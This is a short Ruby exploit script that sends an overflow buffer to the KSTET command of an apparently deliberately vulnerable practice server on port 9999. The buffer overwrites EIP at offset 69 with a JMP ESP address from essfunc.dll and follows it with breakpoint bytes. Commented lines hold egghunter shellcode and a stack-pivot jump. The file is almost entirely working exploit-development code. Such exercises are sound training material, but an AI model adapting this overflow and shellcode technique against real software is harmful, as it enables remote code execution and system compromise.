#!/usr/bin/env ruby

require 'socket'

#EIP = 0x41336341 -> Offset = 69
badHeader = "KSTET ."
badData = "\x41" * 69
badData += "\xAF\x11\x50\x62" # Memory address 0x625011AF # JMP ESP essfunc.dll
badData += "\xcc" * (1000 - badData.size)
# badData += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# badData += "\x90" * (69 - badData.size)
# badData += "\xAF\x11\x50\x62" # Memory address 0x625011AF # JMP ESP essfunc.dll
# badData +=  "\x89\xe0\x83\xe8\x40\xff\xe0"
# jmpShellCode = "\x89\xe0" #mov eax, esp
# jmpShellCode += "\x83\xe8\x40" #sub eax, 0x40
# jmpShellCode += "\xff\xe0" #jmp eax

host = "192.168.0.78" # ARGV[0]
port = "9999"  # ARGV[1]

# Config Server
s = TCPSocket.open(host, port)
receive = s.recv(1024)
puts receive

puts "[+] Sending Evil buffer"
s.send(badHeader + badData, 0)
s.close